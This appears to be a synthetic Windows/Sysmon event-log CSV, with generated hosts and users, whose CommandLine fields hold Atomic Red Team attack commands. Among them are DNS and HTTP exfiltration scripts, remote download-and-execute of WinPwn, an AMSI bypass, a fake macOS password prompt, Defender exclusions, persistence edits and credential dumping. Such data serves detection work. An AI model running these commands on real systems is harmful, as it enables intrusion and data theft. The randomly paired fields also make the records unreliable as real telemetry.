EventID,EventType,ComputerName,User,ProcessID,ProcessName,CommandLine,LogonID,LogonGuid,SourceProcessID,SourceProcessName,SourceImage,DestinationProcessID,DestinationProcessName,DestinationImage,UtcTime
1,Process Create,web-36.lane.biz,lisaalvarez,4577,taskmgr.exe,"""$dnsServer = \""#{dns_server}\""\n$exfiltratedData = \""#{exfiltrated_data}\""\n$chunkSize = #{chunk_size}\n\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\n$encodedData = [Convert]::ToBase64String($encodedData)\n$chunks = $encodedData -split \""(.{$chunkSize})\""\n\nforeach ($chunk in $chunks) {\n    $dnsQuery = $chunk + \"".\"" + $dnsServer\n    Resolve-DnsName -Name $dnsQuery\n    Start-Sleep -Seconds 5\n}\n"",",589938,e9e0e6c8-0c65-4fb3-bf42-dea59d3a4876,1473,powershell.exe,C:\Program Files\majority..dll,2027,rundll32.exe,C:\Users\Public\PM..dll,2024-05-17T01:36:51.580802Z
3,Network Connection,email-01.burns.com,williamslaura,6076,nc.exe,"""sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)\n"",",972533,412654ef-db6c-422c-a163-d5e4cb4778fa,2839,explorer.exe,C:\Windows\forget..dll,4591,malware.exe,C:\Users\Public\contain..exe,2024-05-17T01:36:51.580802Z
3,Network Connection,lt-24.hicks.biz,veronica29,2186,powershell.exe,"""echo var url = \""#{file_url}\"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}\n"",",633122,a8e318d4-3780-430f-98cf-fcb724b271e5,7276,malware.exe,C:\Windows\wish..exe,7558,cmd.exe,C:\Windows\recognize..exe,2024-05-17T01:36:51.580802Z
1,Process Create,lt-89.jordan.biz,kevinreed,5565,cmd.exe,"""if [ $USER == \""root\"" ]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi\n"",",965303,333b0553-a157-4005-bc68-a29c4395dc48,6534,explorer.exe,C:\Program Files\major..dll,1704,regsvr32.exe,C:\Program Files\then..exe,2024-05-17T01:36:51.581796Z
11,File Create,email-18.hammond.com,oharrison,4406,malware.exe,"""Start-Process \""#{exe_binary}\""\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"",",772752,007270f1-c64c-4c7d-a6ca-10e21112d77b,5936,powershell.exe,C:\Windows\next..exe,5386,nc.exe,C:\Windows\their..dll,2024-05-17T01:36:51.581938Z
11,File Create,db-97.gardner-zavala.biz,christopher22,8927,backdoor.exe,"""dsquery * -filter \""(objectClass=trustedDomain)\"" -attr *\n"",",740327,f8d9fdc1-e423-4261-8fad-98b941cb02d4,4210,nc.exe,C:\Windows\yeah..dll,6326,rundll32.exe,C:\Program Files\school..exe,2024-05-17T01:36:51.581938Z
1,Process Create,laptop-69.nichols-carlson.com,yhawkins,1183,mimikatz.exe,"""sudo cp \""#{plist}\"" /etc/emond.d/rules/T1546.014_emond.plist\nsudo touch /private/var/db/emondClients/T1546.014\n"",",828264,7b84f94d-aa48-4fe9-a9e9-e40badf85a68,5512,regsvr32.exe,C:\Program Files\course..exe,6083,backdoor.exe,C:\Program Files\charge..exe,2024-05-17T01:36:51.582445Z
11,File Create,laptop-01.johnston.com,coxjacob,3021,regsvr32.exe,"""New-ItemProperty \""HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \""HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name DefaultUserName -Value Administrator -Force\nNew-ItemProperty \""HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name DefaultDomainName -Value contoso.com -Force\nNew-ItemProperty \""HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name DefaultPassword  -Value password1 -Force\n"",",504323,f61f447d-da3b-451b-9017-82300164a721,7794,cmd.exe,C:\Users\Public\organization..exe,7375,powershell.exe,C:\Users\Public\fund..exe,2024-05-17T01:36:51.582445Z
1,Process Create,desktop-37.simmons-cook.info,pruittann,3948,cmd.exe,"""reg add \""HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\""\nreg add \""HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\"" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0\nreg add \""HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\"" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe\natbroker /start malware_test\n"",",193158,37d751e0-3f4f-4e1e-ab45-a26fb256a13f,1690,nc.exe,C:\Program Files\sit..exe,8391,taskmgr.exe,C:\Windows\hit..exe,2024-05-17T01:36:51.582445Z
11,File Create,lt-77.fuller-stout.net,jhill,7921,cmd.exe,"""wscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs\n"",",774112,79647ac4-d7b5-4e6c-8729-6aa94de302c9,9051,regsvr32.exe,C:\Users\Public\investment..exe,3670,mimikatz.exe,C:\Windows\production..exe,2024-05-17T01:36:51.583453Z
11,File Create,email-83.sullivan.com,sherrywilson,6445,powershell.exe,"""systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \""$(date) $(whoami)\"" >>/tmp/log'\n"",",423689,acecb5ac-2df8-4678-a574-3021f8ccffcc,9136,regsvr32.exe,C:\Users\Public\but..exe,7646,rundll32.exe,C:\Windows\president..exe,2024-05-17T01:36:51.583453Z
3,Network Connection,db-33.williams.net,josephthomas,1954,backdoor.exe,"""cmstp.exe /s \""#{inf_file_uac}\"" /au\n"",",375829,6c6aeb89-b3f2-4c8e-8f26-cfb816f27d63,9377,rundll32.exe,C:\Windows\participant..dll,4774,powershell.exe,C:\Windows\special..exe,2024-05-17T01:36:51.583453Z
7,Image Load,web-72.sullivan-lucas.com,maciasamy,1392,rundll32.exe,"""pw useradd art -g wheel -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\npw lock art\npw usermod art -e +1d\npw unlock art\npw user mod art -e +99d\nsu art\nwhoami\nexit\n"",",881748,dd5a82a4-7f2a-411e-92c8-f958df86173b,1086,backdoor.exe,C:\Program Files\far..exe,6675,taskmgr.exe,C:\Program Files\role..dll,2024-05-17T01:36:51.583453Z
1,Process Create,web-37.murillo.com,rebecca94,4429,rundll32.exe,"""rundll32.exe \""#{input_file}\"",#2\n"",",801908,6544c78c-9a6c-4401-bd25-606686dae543,6441,malware.exe,C:\Program Files\consider..dll,9172,powershell.exe,C:\Program Files\no..exe,2024-05-17T01:36:51.584454Z
7,Image Load,lt-45.christian.com,rcarter,8961,cmd.exe,"""chmod +x #{linenum}\nbash #{linenum}\n"",",964057,cdfb4d25-0abf-4cb5-9838-3e256dc56120,6072,malware.exe,C:\Windows\power..exe,3343,mimikatz.exe,C:\Program Files\west..dll,2024-05-17T01:36:51.584454Z
7,Image Load,desktop-90.johnson-luna.com,qmiller,3652,backdoor.exe,"""where /R C:\\Users\\ places.sqlite\n"",",234658,ba1f80cc-6313-47b9-96cc-da7b6cfe638f,8970,taskmgr.exe,C:\Users\Public\young..dll,3604,powershell.exe,C:\Windows\herself..exe,2024-05-17T01:36:51.584454Z
5,Process Terminate,laptop-92.adams.com,valexander,6420,cmd.exe,"""$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\nSet-ItemProperty -Path \""HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\"" -Name 'Security Packages old' -Value \""$oldvalue\"";\n$newvalue = \""AtomicTest.dll\"";\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' -Value $newvalue\n"",",980015,725c9827-3eea-44d2-90d4-538969360bcc,2564,powershell.exe,C:\Windows\surface..exe,6573,taskmgr.exe,C:\Users\Public\may..exe,2024-05-17T01:36:51.584454Z
3,Network Connection,laptop-52.gomez.com,jamesstokes,1380,taskmgr.exe,"""wmic useraccount get /ALL /format:csv\n"",",864972,780bafc2-831d-4bf4-a7ed-a4940f1cdf53,4334,cmd.exe,C:\Program Files\also..exe,9574,backdoor.exe,C:\Windows\everyone..exe,2024-05-17T01:36:51.584454Z
1,Process Create,db-45.nelson.com,tanyaowens,4665,regsvr32.exe,"""ufw logging off\n"",",443496,985deca3-cdb1-4d9c-96a8-87f731eaca9f,1302,cmd.exe,C:\Users\Public\late..exe,8000,taskmgr.exe,C:\Windows\magazine..exe,2024-05-17T01:36:51.585451Z
3,Network Connection,web-15.burgess.org,monica17,3873,powershell.exe,"""sudo touch /Library/StartupItems/EvilStartup.plist\n"",",243490,33da3def-c65a-4adc-bd9e-66599ab732f5,8496,explorer.exe,C:\Users\Public\bag..dll,9296,powershell.exe,C:\Windows\sign..dll,2024-05-17T01:36:51.585451Z
5,Process Terminate,email-62.mcguire.com,stephenadkins,7034,rundll32.exe,"""Start-Process \""#{exe_binary}\""\nStart-Sleep -Seconds 7\nif (Test-Path \""C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\"") { Remove-Item \""C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\"" -Force; Write-Host \""[+] hello.log removed.\"" }\n"",",173336,a418d97b-6890-4d98-bd78-1dde54be1473,4881,taskmgr.exe,C:\Users\Public\seek..dll,4204,powershell.exe,C:\Windows\go..exe,2024-05-17T01:36:51.585451Z
5,Process Terminate,web-27.watkins.com,connie36,5307,rundll32.exe,"""copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe\n"",",879912,0371cbf1-bf18-4380-9814-477d5ab7032d,2112,cmd.exe,C:\Users\Public\certainly..exe,9603,powershell.exe,C:\Program Files\still..exe,2024-05-17T01:36:51.585451Z
1,Process Create,desktop-96.adams.com,erin93,8728,backdoor.exe,"""$excludedpath= \""#{excluded_folder}\""\nAdd-MpPreference -ExclusionPath $excludedpath"",",246426,59037d75-8808-4757-a083-19fd21894175,1545,rundll32.exe,C:\Users\Public\necessary..dll,6445,taskmgr.exe,C:\Windows\condition..exe,2024-05-17T01:36:51.585451Z
3,Network Connection,lt-46.ball.com,msmith,6325,rundll32.exe,"""#{exe_path} & ps\nTMP=`ps | grep totally_legit`\nif [ -z \""${TMP}\"" ] ; then echo \""renamed process NOT FOUND in process list\"" && exit 1; fi\nexit 0\n"",",176869,8b05f69e-645d-4d82-842e-c2a6b5c193d9,9967,explorer.exe,C:\Windows\eye..dll,4606,malware.exe,C:\Users\Public\everything..dll,2024-05-17T01:36:51.586454Z
5,Process Terminate,srv-20.may.com,walleric,1362,nc.exe,"""\""PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"" -f (objectcategory=group) #{optional_args}\n"",",793459,780f97d2-5b8e-41d5-8516-101ca3fa60da,7184,backdoor.exe,C:\Users\Public\once..dll,3454,powershell.exe,C:\Windows\need..exe,2024-05-17T01:36:51.586454Z
3,Network Connection,lt-02.allen-hale.com,rodriguezlisa,6452,rundll32.exe,"""PWD_SPOOF=$(osascript -e 'display dialog \""To perform a security update MacOS needs your passphrase.\"" with title \""MacOS Security Update\"" default answer \""\"" with icon stop with hidden answer')\necho $PWD_SPOOF\n"",",728383,c8902672-b0ba-45c1-b543-1a8c00f8818f,9914,explorer.exe,C:\Users\Public\get..dll,5873,explorer.exe,C:\Windows\describe..dll,2024-05-17T01:36:51.586454Z
5,Process Terminate,laptop-28.campbell-thomas.biz,susansolis,2382,powershell.exe,"""$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\""#{plaintext}\""))\n$key = \""#{key}\""\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive\n"",",733895,f392e942-bc4b-435c-90b6-476c6d587259,6486,regsvr32.exe,C:\Windows\piece..exe,7267,nc.exe,C:\Program Files\section..dll,2024-05-17T01:36:51.586454Z
5,Process Terminate,srv-91.pearson.com,erikanderson,6861,mimikatz.exe,"""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"",",838518,5bd85191-7174-44bf-a57a-b81c47e9c33b,3693,regsvr32.exe,C:\Program Files\tonight..exe,8953,rundll32.exe,C:\Program Files\subject..dll,2024-05-17T01:36:51.587454Z
5,Process Terminate,email-85.rowland.com,lopezronald,2449,taskmgr.exe,"""$xml = [System.IO.File]::ReadAllText(\""#{xml_path}\"")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \""Root\\Microsoft\\Windows\\TaskScheduler\"" -MethodName \""RegisterByXml\"" -Arguments @{ Force = $true; Xml =$xml; }\n"",",237842,b46680b3-7d97-497f-be56-523bfb722ae3,9264,cmd.exe,C:\Windows\indicate..dll,3249,mimikatz.exe,C:\Windows\hour..exe,2024-05-17T01:36:51.587454Z
1,Process Create,lt-83.smith.info,margaret75,5803,mimikatz.exe,"""New-ItemProperty -Path \""HKLM:\\Software\\Microsoft\\Command Processor\"" -Name \""AutoRun\"" -Value \""#{command}\"" -PropertyType \""String\"""",",295737,177cfed2-1a21-41bf-9497-0978dd8df07e,3122,regsvr32.exe,C:\Windows\production..exe,8919,cmd.exe,C:\Windows\much..exe,2024-05-17T01:36:51.587454Z
11,File Create,web-56.rodriguez.info,michele23,3670,malware.exe,"""PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe -w \""%temp%\\nanodump.dmp\""\n"",",642239,3fdfada8-27b3-485e-a933-1f547ca3aa7b,4250,powershell.exe,C:\Users\Public\property..exe,6892,cmd.exe,C:\Program Files\chance..dll,2024-05-17T01:36:51.587454Z
5,Process Terminate,web-89.arnold.com,patricia99,1577,rundll32.exe,"""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \""C:\\windows\\system32\\cmd.exe\"" -technique magic"",",148470,b9862982-d78e-469b-8a7a-8b997fec196e,5789,malware.exe,C:\Program Files\push..exe,9832,regsvr32.exe,C:\Program Files\sea..dll,2024-05-17T01:36:51.588452Z
11,File Create,desktop-27.arnold-nash.org,davidbailey,6104,mimikatz.exe,"""mkdir -p /var/spool/mail/copy\nfor file in /var/spool/mail/*; do\n  if [ \""$(basename \""$file\"")\"" != \""copy\"" ]\n  then\n    cp -R \""$file\"" /var/spool/mail/copy/\n  fi\ndone\nrm -rf /var/spool/mail/copy/*\n"",",731481,64f4fb9e-d28e-4838-9f39-661395e4315b,7384,taskmgr.exe,C:\Program Files\argue..dll,1271,malware.exe,C:\Users\Public\purpose..dll,2024-05-17T01:36:51.588452Z
7,Image Load,lt-28.grant.info,tyler72,8739,backdoor.exe,"""bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}\n"",",786553,f5242b1e-1bb2-4711-a5c2-c9bc4be129ef,1148,rundll32.exe,C:\Users\Public\give..dll,9937,regsvr32.exe,C:\Users\Public\real..dll,2024-05-17T01:36:51.588452Z
5,Process Terminate,db-06.butler.com,fgardner,6968,malware.exe,"""for %i in (C$ IPC$ ADMIN$) do net share %i /delete"",",621853,00136989-46e4-4d09-93d5-cda4c4f02c96,5532,malware.exe,C:\Windows\huge..exe,5783,cmd.exe,C:\Windows\century..dll,2024-05-17T01:36:51.588452Z
7,Image Load,laptop-33.gutierrez.biz,pmccoy,4319,malware.exe,"""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSharpCloud -consoleoutput -noninteractive  "",",283702,0138e83d-b025-4abd-ac11-59c9f58121ec,4499,nc.exe,C:\Program Files\wall..dll,4015,taskmgr.exe,C:\Program Files\state..exe,2024-05-17T01:36:51.588452Z
7,Image Load,email-76.petty-kim.info,sallydavis,8508,malware.exe,"""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nmimiload -consoleoutput -noninteractive"",",598996,6a89372c-0f1c-4266-bdfa-e51c183c5802,6443,malware.exe,C:\Users\Public\food..dll,7269,regsvr32.exe,C:\Windows\again..exe,2024-05-17T01:36:51.588452Z
11,File Create,srv-18.young.com,brittanymontes,3970,nc.exe,"""Compress-Archive -Path \""#{input_file}\"" -DestinationPath #{output_file} -Force\n"",",281416,f5e3d939-8b20-42b7-8da4-9b7aba5bcbfc,1581,taskmgr.exe,C:\Users\Public\whom..dll,9003,cmd.exe,C:\Program Files\child..dll,2024-05-17T01:36:51.589452Z
7,Image Load,email-78.brown.com,moorenancy,2693,taskmgr.exe,"""mshta vbscript:Execute(\""CreateObject(\""\""Wscript.Shell\""\"").Run \""\""powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\""\"":close\"")\n"",",622283,42f1ebc0-7b2a-48b9-8af7-886d520ac3fe,6998,rundll32.exe,C:\Program Files\set..dll,4587,backdoor.exe,C:\Users\Public\yet..dll,2024-05-17T01:36:51.589452Z
1,Process Create,db-07.graham-harris.info,woodardjames,9894,taskmgr.exe,"""Import-Module \""PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\""\nInvoke-ShareFinder #{parameters}\n"",",357206,5021ad43-f973-4d13-b397-77590e85b036,4099,taskmgr.exe,C:\Users\Public\result..dll,4664,powershell.exe,C:\Windows\represent..dll,2024-05-17T01:36:51.589452Z
5,Process Terminate,email-78.taylor.org,sarahgarcia,2203,malware.exe,"""at 13:20 /interactive cmd\n"",",769045,727b1ac8-342f-40cb-a204-9e8448af2d3c,5685,powershell.exe,C:\Users\Public\alone..exe,4384,explorer.exe,C:\Windows\foreign..dll,2024-05-17T01:36:51.589452Z
5,Process Terminate,lt-49.webster.com,blairdanielle,3170,powershell.exe,"""cmd.exe /c \""wmic \tcsproduct \tget UUID\"" \ncmd.exe /c \""fsutil behavior \tset SymlinkEvaluation R2L:1\"" \ncmd.exe /c \""fsutil behavior set \tSymlinkEvaluation R2R:1\""\nreg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      \ncopy \""PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\"" $env:temp\ncmd.exe /c \""$env:temp\\psexec.exe  -accepteula  \\\\#{targethost} cmd.exe  /c echo \""--access-token\""\""\n"",",947828,0f3975d0-083c-4a85-8feb-a333a92047ee,3079,regsvr32.exe,C:\Users\Public\fight..exe,5313,cmd.exe,C:\Program Files\catch..exe,2024-05-17T01:36:51.590454Z
1,Process Create,email-90.smith.com,johnwinters,5959,explorer.exe,"""Set-PSReadlineOption -HistorySaveStyle SaveNothing\n"",",113760,117b928d-337a-4b32-92c9-0f9350e47f40,7288,regsvr32.exe,C:\Users\Public\traditional..dll,7377,explorer.exe,C:\Program Files\who..dll,2024-05-17T01:36:51.590454Z
7,Image Load,lt-41.ferrell.org,rvasquez,8592,malware.exe,"""copy #{exe_to_launch} not_an_scr.scr\nrundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr\n"",",403624,e1cc4c5d-f8e1-4924-b4f6-74ba63288e4e,1784,rundll32.exe,C:\Users\Public\development..exe,2851,regsvr32.exe,C:\Users\Public\firm..exe,2024-05-17T01:36:51.590454Z
5,Process Terminate,desktop-44.smith.com,rdillon,8048,regsvr32.exe,""". \""$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\""\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \""#{spawnto_process_path}\"" -dllpath \""#{dll_path}\""\n"",",917304,9d0a61c6-d02e-44cc-8ab8-7872f05bd8d4,2032,powershell.exe,C:\Users\Public\collection..dll,4679,rundll32.exe,C:\Users\Public\work..dll,2024-05-17T01:36:51.590454Z
7,Image Load,db-73.king-sutton.com,robert96,4842,backdoor.exe,"""$oldvalue = $(Get-ItemPropertyValue -Path  \""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name \""Shell\"");\nSet-ItemProperty -Path \""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name \""Shell-backup\"" -Value \""$oldvalue\"";\n$newvalue = $oldvalue + \"", #{payload}\"";\nSet-ItemProperty -Path  \""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name \""Shell\"" -Value \""$newvalue\""\n"",",982760,05f87820-16b9-41f2-986c-0dce4f6a25d9,3854,mimikatz.exe,C:\Users\Public\network..dll,5775,mimikatz.exe,C:\Users\Public\I..dll,2024-05-17T01:36:51.590454Z
11,File Create,email-01.murphy.com,kaylamorales,1513,regsvr32.exe,"""#{mofcomp_path} \""#{mof_file}\""\n"",",325387,86013b95-9470-4284-aaba-f869ee31965d,9602,regsvr32.exe,C:\Program Files\according..exe,5066,malware.exe,C:\Program Files\walk..dll,2024-05-17T01:36:51.590454Z
5,Process Terminate,db-65.moreno-nguyen.info,carrillokelly,7779,rundll32.exe,"""\""#{msxsl_exe}\"" \""#{xmlfile}\"" \""#{xslfile}\""\n"",",658197,ebf6014b-bc27-43d5-8e9b-a2b5d2e96328,8546,backdoor.exe,C:\Windows\general..dll,2992,taskmgr.exe,C:\Windows\lawyer..exe,2024-05-17T01:36:51.590454Z
3,Network Connection,db-35.callahan-castro.com,banksdonald,7221,taskmgr.exe,"""C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*"",",979957,355325ef-59ff-4927-b5e7-e70a7c569b85,3170,nc.exe,C:\Program Files\thank..dll,7892,backdoor.exe,C:\Windows\child..exe,2024-05-17T01:36:51.590454Z
1,Process Create,srv-70.hernandez.biz,alexandria80,6034,explorer.exe,"""secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt\n"",",997713,7890373f-5323-41f0-848e-da0cc6a5158a,3065,taskmgr.exe,C:\Users\Public\Republican..dll,8119,regsvr32.exe,C:\Users\Public\must..exe,2024-05-17T01:36:51.592030Z
5,Process Terminate,web-11.perry.biz,joshua43,4148,powershell.exe,"""Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n"",",661385,b51d1bb6-0afa-42c4-a4e4-419c3dbc5dcc,5513,mimikatz.exe,C:\Users\Public\her..exe,1532,explorer.exe,C:\Program Files\ability..dll,2024-05-17T01:36:51.592030Z
7,Image Load,web-53.warren.com,xwoodward,4309,taskmgr.exe,"""Stop-Service -Name #{service_name}\nRemove-Service -Name #{service_name}\n"",",996908,0e1e197d-87aa-4aa5-81c3-a5055e69de36,9880,nc.exe,C:\Users\Public\child..exe,6874,malware.exe,C:\Users\Public\know..exe,2024-05-17T01:36:51.592030Z
7,Image Load,desktop-16.levine.org,bdixon,6523,malware.exe,"""$xml = [System.IO.File]::ReadAllText(\""#{xml_path}\"")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \""Root\\Microsoft\\Windows\\TaskScheduler\"" -MethodName \""RegisterByXml\"" -Arguments @{ Force = $true; Xml =$xml; }\n"",",935255,f04c6f3e-8a2e-475d-817f-4a602c01bc64,7046,mimikatz.exe,C:\Program Files\smile..dll,9327,malware.exe,C:\Program Files\key..dll,2024-05-17T01:36:51.592030Z
